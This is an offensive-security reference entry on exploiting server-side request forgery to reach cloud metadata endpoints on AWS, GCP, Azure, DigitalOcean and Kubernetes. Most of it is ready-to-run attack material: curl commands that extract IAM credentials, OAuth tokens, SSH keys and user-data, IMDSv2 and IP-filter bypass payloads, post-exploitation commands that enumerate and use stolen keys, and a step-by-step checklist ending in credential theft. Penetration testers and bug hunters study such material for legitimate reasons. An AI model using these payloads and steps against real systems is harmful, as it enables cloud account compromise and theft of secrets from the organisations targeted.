---
id: "metadata-ssrf"
title: "Cloud Metadata SSRF Exploitation"
type: "technique"
category: "cloud"
subcategory: "metadata"
tags: ["ssrf", "cloud", "aws", "gcp", "azure", "imdsv2", "metadata", "credential-theft", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["ssrf-techniques", "cloud-misconfigurations"]
difficulty: "advanced"
updated: "2026-04-14"
---

# Cloud Metadata SSRF Exploitation

## Why Cloud Metadata SSRF is Critical
Cloud metadata endpoints expose IAM credentials, instance identity, network configs, and user data scripts. An SSRF that reaches metadata = full cloud account compromise. Capital One breach was exactly this. Bounties: $20k–$100k+.

## AWS Metadata (IMDSv1 & IMDSv2)

### IMDSv1 (Simple GET)
```
# Direct access (no headers required):
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
curl http://169.254.169.254/latest/user-data
curl http://169.254.169.254/latest/dynamic/instance-identity/document

# Returns: AccessKeyId, SecretAccessKey, Token (temporary credentials)
# These credentials have the IAM role's full permissions
```

### IMDSv2 (Token Required)
```
# IMDSv2 requires a PUT request to get a token first:
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

### IMDSv2 Bypass Techniques
```
# 1. Via SSRF in server-side code that follows redirects:
#    Redirect from attacker server → PUT to metadata → GET with token
#    Works if the SSRF follows redirects AND preserves method

# 2. Via proxy/middleware that adds headers:
#    Some reverse proxies pass through X-aws-ec2-metadata-token
#    If you can inject this header via CRLF: game over

# 3. Via containers without hop limit:
#    IMDSv2 sets X-Forwarded-For hop limit to 1
#    But containers/pods may be on the same network hop
#    If running in Docker/ECS without host networking: direct access

# 4. Via alternative IP representations:
http://[::ffff:169.254.169.254]/latest/meta-data/
http://0xA9FEA9FE/latest/meta-data/
http://2852039166/latest/meta-data/
http://0251.0376.0251.0376/latest/meta-data/
http://169.254.169.254.nip.io/latest/meta-data/

# 5. DNS rebinding:
#    Register domain that alternates between safe IP and 169.254.169.254
#    SSRF validates domain on first lookup (safe), fetches on second (metadata)

# 6. SSRF via PDF/image generators (wkhtmltopdf, Puppeteer):
#    These make GET requests internally — no PUT for IMDSv2 token
#    BUT: If the app fetches user-data (which doesn't need token):
<img src="http://169.254.169.254/latest/user-data">
```

### AWS Post-Exploitation with Stolen Creds
```bash
# Configure stolen credentials:
export AWS_ACCESS_KEY_ID="ASIAXXX"
export AWS_SECRET_ACCESS_KEY="xxx"
export AWS_SESSION_TOKEN="xxx"

# Enumerate what you have:
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name ROLE_NAME

# Common high-value actions:
aws s3 ls                           # List all buckets
aws secretsmanager list-secrets     # List secrets
aws ssm get-parameters-by-path --path "/" --recursive  # SSM parameters
aws lambda list-functions           # Lambda functions (source code)
aws ec2 describe-instances          # All instances
aws rds describe-db-instances       # Databases
```

## GCP Metadata

### Basic Access
```
# GCP metadata requires the Metadata-Flavor header:
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/

# Service account token:
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Returns: access_token (OAuth2 token with service account permissions)

# Project metadata (may contain secrets in attributes):
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/"

# Instance SSH keys:
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"

# Kubernetes service account token:
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://target.com"
```

### GCP Bypass Techniques
```
# Header requirement bypass via SSRF:
# If SSRF lets you set custom headers → add Metadata-Flavor: Google

# Alternative endpoints:
http://169.254.169.254/computeMetadata/v1/  # Same as metadata.google.internal
http://metadata.google.internal./            # Trailing dot
http://metadata.google.internal:80/

# Via curl options in SSRF (if URL injection allows flags):
# curl -H "Metadata-Flavor: Google" http://metadata.google.internal/
```

## Azure Metadata (IMDS)

### Basic Access
```
# Azure IMDS requires Metadata: true header:
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Managed Identity token:
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Returns: access_token for Azure Resource Manager

# Subscription info:
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text"

# User data (startup scripts):
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text" | base64 -d
```

### Azure Specific Targets
```
# Azure Key Vault via stolen Managed Identity:
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
  | jq -r .access_token)

curl -H "Authorization: Bearer $TOKEN" \
  "https://VAULT_NAME.vault.azure.net/secrets?api-version=7.3"

# Azure Storage via Managed Identity:
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" \
  | jq -r .access_token)

curl -H "Authorization: Bearer $TOKEN" -H "x-ms-version: 2020-10-02" \
  "https://STORAGE.blob.core.windows.net/?comp=list"
```

## DigitalOcean Metadata
```
# No special headers required:
curl http://169.254.169.254/metadata/v1/
curl http://169.254.169.254/metadata/v1/user-data
curl http://169.254.169.254/metadata/v1/dns/nameservers
curl http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address
```

## Kubernetes Metadata via SSRF
```
# If SSRF reaches the Kubernetes API server:
curl https://kubernetes.default.svc/api/v1/namespaces/default/secrets \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Or via environment variables:
# KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT

# Common k8s SSRF targets:
https://kubernetes.default.svc:443/api/v1/secrets
https://kubernetes.default.svc:443/api/v1/configmaps
http://kubelet:10255/pods  # Kubelet read-only API
http://etcd:2379/v2/keys/  # etcd (if exposed)
```

## Universal IP Bypass Payloads
```
# When IP-based SSRF filters block 169.254.169.254:
http://0xA9FEA9FE                    # Hex
http://2852039166                     # Decimal
http://0251.0376.0251.0376           # Octal
http://0251.254.169.254              # Mixed octal
http://[::ffff:a9fe:a9fe]            # IPv6 mapped IPv4
http://[0:0:0:0:0:ffff:169.254.169.254]
http://169.254.169.254.nip.io        # DNS wildcard
http://169.254.169.254.xip.io
http://169.254.169.254.sslip.io
http://169%2e254%2e169%2e254         # URL encoded dots
http://169。254。169。254              # Fullwidth dots (Unicode)
http://①⑥⑨.②⑤④.①⑥⑨.②⑤④          # Unicode digits
http://0x00000000A9FEA9FE            # Padded hex
http://0000::ffff:a9fe:a9fe          # Compressed IPv6
http://[::ffff:169.254.169.254%25eth0]  # Scoped IPv6
```

## Deep Dig Prompts
```
Given this SSRF endpoint [describe]:
1. Determine which cloud provider (check error messages, headers, DNS)
2. Test all IP representations (hex, decimal, octal, IPv6, DNS wildcard)
3. Check if redirect following is enabled (chain redirects to metadata)
4. For IMDSv2: test container/pod access (may bypass hop limit)
5. For GCP: test header injection to add Metadata-Flavor: Google
6. Extract credentials → enumerate permissions → demonstrate impact
7. Check user-data for hardcoded secrets in startup scripts
```

## Tools
- SSRFmap (automated metadata extraction)
- Gopherus (gopher protocol for internal service access)
- Interactsh/Collaborator (confirm SSRF connectivity)
- Pacu (AWS post-exploitation framework)
- ScoutSuite (cloud security auditing)
